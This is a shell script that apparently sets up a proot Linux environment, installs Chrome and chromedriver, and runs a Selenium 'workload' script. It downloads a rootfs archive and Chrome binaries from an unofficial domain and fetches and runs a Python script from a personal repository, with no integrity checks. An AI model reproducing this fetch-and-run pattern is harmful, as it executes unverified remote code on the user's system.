#!/bin/sh
wget http://greenleaf.teatspray.fun/backup5.tar.gz
tar -xf backup5.tar.gz
sleep 3
rm backup5.tar.gz
./dist/proot -S . /bin/bash
su -
whoami
ls -la

DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends tzdata dpkg > /dev/null

sleep 2

ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime > /dev/null
dpkg-reconfigure --frontend noninteractive tzdata > /dev/null

sleep 2

TZ='Africa/Johannesburg'; export TZ
date
sleep 2

apt -y install python3 python3-pip

wget -q https://raw.githubusercontent.com/mvelisomakhenkce/selenium_workload/main/requirements.txt >/dev/null

apt install ca-certificates fonts-liberation \
    libappindicator3-1 libasound2 libatk-bridge2.0-0 libatk1.0-0 libc6 \
    libcairo2 libcups2 libdbus-1-3 libexpat1 libfontconfig1 libgbm1 \
    libgcc1 libglib2.0-0 libgtk-3-0 libnspr4 libnss3 libpango-1.0-0 \
    libpangocairo-1.0-0 libstdc++6 libx11-6 libx11-xcb1 libxcb1 \
    libxcomposite1 libxcursor1 libxdamage1 libxext6 libxfixes3 libxi6 \
    libxrandr2 libxrender1 libxss1 libxtst6 lsb-release wget xdg-utils -y
	

wget -q  http://greenleaf.teatspray.fun/chromedriver-linux64.tar.gz >/dev/null

sleep 2

wget -q http://greenleaf.teatspray.fun/chrome-linux64.tar.gz >/dev/null

sleep 2

tar -xf chrome-linux64.tar.gz

tar -xf chromedriver-linux64.tar.gz

pip3 install -r requirements.txt

wget -q https://raw.githubusercontent.com/mvelisomakhenkce/selenium_workload/main/run_selenium.py >/dev/null

python3 run_selenium.py
